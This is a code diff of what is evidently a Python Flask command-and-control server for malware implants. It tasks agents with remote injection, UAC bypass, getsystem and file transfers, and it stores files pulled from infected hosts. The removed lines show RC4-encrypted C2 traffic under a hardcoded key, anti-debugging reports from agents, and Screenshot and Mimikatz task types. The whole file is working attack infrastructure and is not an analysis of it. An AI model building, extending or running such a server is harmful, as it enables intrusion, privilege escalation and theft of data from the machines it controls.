@@ -23,9 +23,6 @@ class tasktype(Enum):
     RemoteInject = 11
     BypassUAC = 12
     Getsystem = 13
-    Screenshot = 14
-    Jitter = 15
-    Mimikatz = 16
     
 class requesttype(Enum):
     Registration = 1
@@ -37,7 +34,6 @@ class requesttype(Enum):
     DownloadStart = 7
     DownloadChunk = 8
     DownloadEnd = 9
-    DebugReport = 10 
 
 class processarch(Enum):
     x64 = 1
@@ -56,51 +52,6 @@ app = Flask(__name__)
 app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///' + os_path.join(app.root_path, '..','data.db')
 app.app_context().push()
 db = SQLAlchemy(app)
-
-C2_KEY = "Password1!Password1!"
-
-class DebugReport(db.Model):
-    __tablename__ = 'debugreports'
-    id = db.Column(db.Integer, primary_key=True)
-    agent_id = db.Column(db.String(8), db.ForeignKey('agents.id'))
-    debug_detected = db.Column(db.Boolean, default=False)
-    timestamp = db.Column(db.DateTime(timezone=True), server_default=db.func.now())
-    
-    def __init__(self, agent_id, debug_detected):
-        self.agent_id = agent_id
-        self.debug_detected = debug_detected
-    
-    def json(self):
-        return {
-            'id': self.id,
-            'agent_id': self.agent_id,
-            'debug_detected': self.debug_detected,
-            'timestamp': self.timestamp
-        }
-
-def rc4_crypt(data: bytes, key: bytes) -> bytes:
-    S = list(range(256))
-    j = 0
-    # Key-scheduling
-    for i in range(256):
-        j = (j + S[i] + key[i % len(key)]) & 0xFF
-        S[i], S[j] = S[j], S[i]
-    # Pseudo-random generation
-    i = j = 0
-    out = bytearray()
-    for byte in data:
-        i = (i + 1) & 0xFF
-        j = (j + S[i]) & 0xFF
-        S[i], S[j] = S[j], S[i]
-        K = S[(S[i] + S[j]) & 0xFF]
-        out.append(byte ^ K)
-    return bytes(out)
-
-def rc4_encrypt_str(s: str) -> str:
-    return rc4_crypt(s.encode('utf-8'), C2_KEY.encode('utf-8')).decode('latin-1')
-
-def rc4_decrypt_str(s: str) -> str:
-    return rc4_crypt(s.encode('latin-1'), C2_KEY.encode('utf-8')).decode('utf-8')
 
 # Models
 class Agent(db.Model):
@@ -307,7 +258,7 @@ import sys
 db.create_all()
 app.config['DEBUG'] = True
 
-good_ips = ['127.0.0.1']
+good_ips = ['127.0.0.1', '192.168.209.154']
 
 #@app.before_request
 def restrict_page():
@@ -320,10 +271,7 @@ def send():
         try:
             req = request.get_json()
             b64d = req.get("d")
-            encrypted_data = base64.b64decode(b64d)
-            # Add this line to decrypt the data
-            decrypted_data = rc4_crypt(encrypted_data, C2_KEY.encode('utf-8'))
-            json_d = decrypted_data.decode('utf-8')
+            json_d = base64.b64decode(b64d).decode('utf-8')
             d = json.loads(json_d)
 
             if not d['data']:
@@ -365,9 +313,11 @@ def send():
                 if data['os']:
                     operating_system = data['os']
             
-                internal_ip = data.get('internal_ip', 'unknown')
+                if data['internal_ip']:
+                    internal_ip = data['internal_ip']
                 
-                external_ip = request.remote_addr
+                if data['external_ip']:
+                    external_ip = data['external_ip']
 
                 myobj = Agent(
                     machine_guid = machine_guid, 
@@ -389,150 +339,83 @@ def send():
 
                 b64data = base64.urlsafe_b64encode(json.dumps(json_data).encode()).decode()
                 response_body = { 'data': b64data }
-                
-            elif d['ht'] == requesttype.DebugReport.value:
-                print("Received debug report:")
-                pprint(data)
-                
-                if 'agent_id' not in data:
-                    print("Missing agent_id in debug report")
-                    response_body = {"message": "error"}
-                    return jsonify(response_body)
-                
-                agent_id = data.get('agent_id')
-                debug_detected = data.get('debug_detected', False)
-                
-                # Create new debug report
-                debug_report = DebugReport(
-                    agent_id=agent_id,
-                    debug_detected=debug_detected
-                )
-                
-                db.session.add(debug_report)
-                
-                # If debugging is detected, add a warning tag to the agent
-                if debug_detected:
-                    agent = db.session.query(Agent).get(agent_id)
-                    if agent:
-                        # You could add a field to store this or just update a note
-                        print(f"⚠️ WARNING: Debugging detected for agent {agent_id}")
-                
-                db.session.commit()
-                response_body = {"message": "OK"}
 
             elif d['ht'] == requesttype.GetNextTask.value:
                 ## get next task
-                if not data.get('agent_id'):
-                    print("No agent_id in GetNextTask request")
-                    response_body = {"message": "error"}
-                    return jsonify(response_body)
+                if not data['agent_id']:
+                    return {}
 
-                agent_id = data.get('agent_id')
-                print(f"Getting next task for agent: {agent_id}")
-                
-                # Verify agent exists
-                agent = db.session.query(Agent).get(agent_id)
-                if agent is None:
-                    print(f"Agent {agent_id} not found")
-                    response_body = {"message": "error"}
-                    return jsonify(response_body)
-                
-                # Update agent timestamp
-                agent.updated = db.func.now()
-                db.session.commit()
-                
-                task = db.session.query(Task).filter(Task.agent_id==agent_id, Task.status==1).order_by(db.asc(Task.updated)).first()
+                task = db.session.query(Task).filter(Task.agent_id==data['agent_id'],Task.status==1).order_by(db.asc(Task.updated)).first()
                 if task is None:
-                    print(f"No pending tasks for agent {agent_id}")
-                    response_body = {"message": "no tasks"}
-                    # Encrypt the response
-                    response_json = json.dumps(response_body)
-                    encrypted_response = rc4_crypt(response_json.encode('utf-8'), C2_KEY.encode('utf-8'))
-                    response_b64 = base64.b64encode(encrypted_response).decode('utf-8')
-                    final_response = {"d": response_b64}
-                    return jsonify(final_response)
+                    return {}
 
-                if task.type == tasktype.Download.value or task.type == tasktype.RemoteInject.value:
+                if task.type in [tasktype.Download.value, 
+                 tasktype.ListPrivs.value,
+                 tasktype.SetPriv.value, 
+                 tasktype.RemoteInject.value,
+                 tasktype.BypassUAC.value,
+                 tasktype.Getsystem.value]:
                     db_file = db.session.query(DownloadFile).get(task.downloadfile_id)
                     if not db_file:
-                        print(f"Download file not found for task {task.id}")
-                        response_body = {"message": "error"}
-                        return jsonify(response_body)
+                       return {}
                     db_file.task_id = task.id
                     if task.type == tasktype.Download.value:
                         task.input = db_file.path
-                
+                    
                 task.status = taskstatus.Pending.value
                 task.updated = db.func.now()
+                agent = db.session.query(Agent).get(task.agent_id)
+                agent.updated = task.updated
                 db.session.commit()
 
-                response_data = {
-                    "input": task.input,
-                    "type": task.type,
-                    "status": task.status,
-                    "id": task.id,
-                    "agent_id": agent.id
-                }
+                json_data = {
+                        "input": task.input,
+                        "type": task.type,
+                        "status": task.status,
+                        "id": task.id,
+                        "agent_id": agent.id
+                    }
                 
-                if task.type == tasktype.Download.value or task.type == tasktype.RemoteInject.value:
-                    response_data["file_id"] = task.downloadfile_id
+                if task.type in [tasktype.Download.value, 
+                 tasktype.ListPrivs.value,
+                 tasktype.SetPriv.value, 
+                 tasktype.RemoteInject.value,
+                 tasktype.BypassUAC.value,
+                 tasktype.Getsystem.value]:
+                    json_data["file_id"] = task.downloadfile_id
                     
-                b64data = base64.urlsafe_b64encode(json.dumps(response_data).encode()).decode()
+                b64data = base64.urlsafe_b64encode(json.dumps(json_data).encode()).decode()
                 
-                # Update task status to Executing
                 task.status = taskstatus.Executing.value
                 db.session.commit()
-                
-                # Respond with the task data
-                response_body = {"data": b64data}
+                response_body = { 'data': b64data }
             elif d['ht'] == requesttype.TaskResult.value:
                 ## task result
-                print("Received task result:")
                 pprint(data) 
-                
-                # Validate required fields
-                if 'id' not in data or 'agent_id' not in data:
-                    print("Missing id or agent_id in task result")
-                    response_body = {"message": "error"}
-                    return jsonify(response_body)
-                    
-                task_id = str(data['id'])
-                agent_id = str(data['agent_id'])
-                
-                # Get the task from the database
-                task = db.session.query(Task).filter(Task.id==task_id, Task.agent_id==agent_id).first()
+                task = db.session.query(Task).filter(Task.id==str(data['id']),Task.agent_id==str(data['agent_id'])).first()
                 if task is None:
-                    print(f"Task {task_id} for agent {agent_id} not found")
-                    response_body = {"message": "error"}
-                    return jsonify(response_body)
+                    print("not task")
+                    return {}
 
-                # Update task status
-                if 'status' in data and data['status'] is not None:
-                    status = int(data['status'])
-                    # check if status is: 4=complete|5=failed|6=notsupported
-                    if status >= 4 and status <= 6: 
-                        task.status = status
-                    else:
-                        task.status = taskstatus.Executing.value
-                
-                # Update task result
-                if 'result' in data and data['result'] is not None:
+                # check if status is: 4=complete|5=failed|6=notsupported
+                if int(data['status']) >= 4 and int(data['status']) <= 6: 
+                    task.status = int(data['status'])
+                else:
+                    task.status = taskstatus.Executing.value
+
+                if data['result'] is None:
+                    print("not result")
+                else:
                     task.result = data['result']
-
-                # Update timestamps
+ 
                 task.updated = db.func.now()
                 agent = db.session.query(Agent).get(task.agent_id)
-                if agent:
-                    agent.updated = task.updated
-                
-                # Commit changes
+                agent.updated = task.updated
                 db.session.commit()
-                
-                # Process screenshot task if needed
-                if task.type == 14:  # Screenshot task
-                    print(f"Screenshot task {task.id} for agent {task.agent_id} processed")
 
-                response_body = {"message": "OK"}
+                response_body = {
+                    "message": "OK",
+                }
             ## upload start
             elif d['ht'] == requesttype.UploadStart.value:
                 task = db.session.query(Task).get(data['task_id'])
@@ -573,74 +456,79 @@ def send():
                 }
             ## upload end
             elif d['ht'] == requesttype.UploadEnd.value:
-                task = db.session.query(Task).filter(Task.id==str(data['task_id']), Task.agent_id==str(data['agent_id'])).first()
+                task = db.session.query(Task).filter(Task.id==str(data['task_id']),Task.agent_id==str(data['agent_id'])).first()
                 if task is None:
                     print("not task")
                     return {}
 
+                if data['result'] is None:
+                    print("not result")
+
+                
                 if data['status'] is None:
                     print("not status")    
                 else:
                     task.status = data['status']
                     
-                task.result = ""  # We will not overwrite screenshot files with the task result.
+                task.result = ""
                 task.updated = db.func.now()
                 agent = db.session.query(Agent).get(task.agent_id)
                 agent.updated = task.updated
                 db.session.commit()
-
+    
                 db_file = db.session.query(UploadFile).get(task.uploadfile_id)
                 if db_file is None:
                     print("db_file doesnt exist")
                     return {}
                 
                 cwd = os.getcwd()
-                # For screenshot tasks, save in a dedicated folder.
-                std_path = ""
+                path = ""
                 if task.type == tasktype.Download.value:
-                    std_path = os_path.join(cwd, "data", task.agent_id, "upload")
+                    path = os_path.join(cwd,"data",task.agent_id,"upload")
                 elif task.type == tasktype.Upload.value:
-                    std_path = os_path.join(cwd, "data", task.agent_id, "download")
-                elif task.type == tasktype.Screenshot.value:
-                    std_path = os_path.join(cwd, "data", "screenshots")
+                    path = os_path.join(cwd,"data",task.agent_id,"download")
+                
                 try:
-                    os.makedirs(std_path, exist_ok=True)
+                    os.makedirs(path)    
                 except OSError as error:
-                    print(error)
+                    print(error)  
+                    
+                save_dir = os_path.join(cwd, "data", task.agent_id, "download", task.id)
+                os.makedirs(save_dir, exist_ok=True)
+                
+                tmp = db_file.path.split('\\')
+                filename = tmp[-1]
 
-                # Build the final save path.
-                if task.type == tasktype.Screenshot.value:
-                    # For screenshots, use a filename that combines task and agent id.
-                    filename = f"{task.id}_{task.agent_id}.png"
-                    fullpath = os_path.join(std_path, filename)
-                else:
-                    save_dir = os_path.join(std_path, task.id)
-                    os.makedirs(save_dir, exist_ok=True)
-                    tmp = db_file.path.split('\\')
-                    filename = tmp[-1]
-                    fullpath = os_path.join(save_dir, filename)
+                #guid = uuid.uuid4()
+                #myguid = str(guid)[0:8]
 
+
+                fullpath = os_path.join(save_dir,filename)
                 print(f"Saving file to {fullpath}")
                 with open(fullpath, 'wb') as fl:
-                    result_chunks = db.session.query(UploadFileChunk).filter(UploadFileChunk.uploadfile_id == task.uploadfile_id).all()
-                    for i in result_chunks:
+                    result = db.session.query(UploadFileChunk).filter(UploadFileChunk.uploadfile_id == task.uploadfile_id).all()
+                    for i in result:
                         fl.write(base64.b64decode(i.data))
                     fl.close()
-
-                # Optionally, log file details (hashes, etc.)
+                
+                #https://www.quickprogrammingtips.com/python/how-to-calculate-md5-hash-of-a-file-in-python.html
                 md5_hash = hashlib.md5()
                 sha256_hash = hashlib.sha256()
                 with open(fullpath, 'rb') as f:
-                    for byte_block in iter(lambda: f.read(4096), b""):
+                    # Read and update hash in chunks of 4K
+                    for byte_block in iter(lambda: f.read(4096),b""):
                         md5_hash.update(byte_block)
                         sha256_hash.update(byte_block)
-                result_text = f"file saved to: {fullpath}\nMD5:{md5_hash.hexdigest()}\nSHA256:{sha256_hash.hexdigest()}\n"
-                b64result = base64.b64encode(result_text.encode('utf-8'))
+                        
+                result = "file saved to: {}\nMD5:{}\nSHA256:{}\n".format(fullpath,md5_hash.hexdigest(),sha256_hash.hexdigest())
+                
+                b64result = base64.b64encode(result.encode('utf-8'))
                 task.result = b64result.decode('utf-8')
                 
                 db.session.commit()
-                response_body = {"message": "OK"}
-                
+                response_body = {
+                    "message": "OK",
+                }    
             ## download file          
             elif d['ht'] == requesttype.DownloadStart.value:
                 task = db.session.query(Task).get(data['task_id'])
@@ -734,11 +622,8 @@ def send():
             }
         finally:
             db.session.close()
-        response_json = json.dumps(response_body)
-        encrypted_response = rc4_crypt(response_json.encode('utf-8'), C2_KEY.encode('utf-8'))
-        response_b64 = base64.b64encode(encrypted_response).decode('utf-8')
-        final_response = {"d": response_b64}    
-        res = make_response(jsonify(final_response), 200)  # Return the encrypted response
+            
+        res = make_response(jsonify(response_body), 200)
         return res
     else:
         return make_response(jsonify({"message": "Request body must be JSON"}), 400)
@@ -1184,23 +1069,6 @@ def build_upload_file():
         return res
     else:
         return make_response(jsonify({"message": "Request body must be JSON"}), 400)
-    
-    
-@app.route("/admin/api/debug_reports", methods=["GET"])
-def list_debug_reports():
-    if request.remote_addr not in good_ips:
-        abort(404)
-    
-    reports = db.session.query(DebugReport).order_by(db.desc(DebugReport.timestamp)).all()
-    return jsonify([r.json() for r in reports])
-
-@app.route("/admin/api/debug_reports/<agent_id>", methods=["GET"])
-def get_agent_debug_reports(agent_id):
-    if request.remote_addr not in good_ips:
-        abort(404)
-    
-    reports = db.session.query(DebugReport).filter(DebugReport.agent_id==agent_id).order_by(db.desc(DebugReport.timestamp)).all()
-    return jsonify([r.json() for r in reports])
        
 # function to render index page
 @app.route('/test_json')
@@ -1213,5 +1081,5 @@ def index():
     return "ok"
  
 if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=8080)
+    app.run()
     db.create_all()
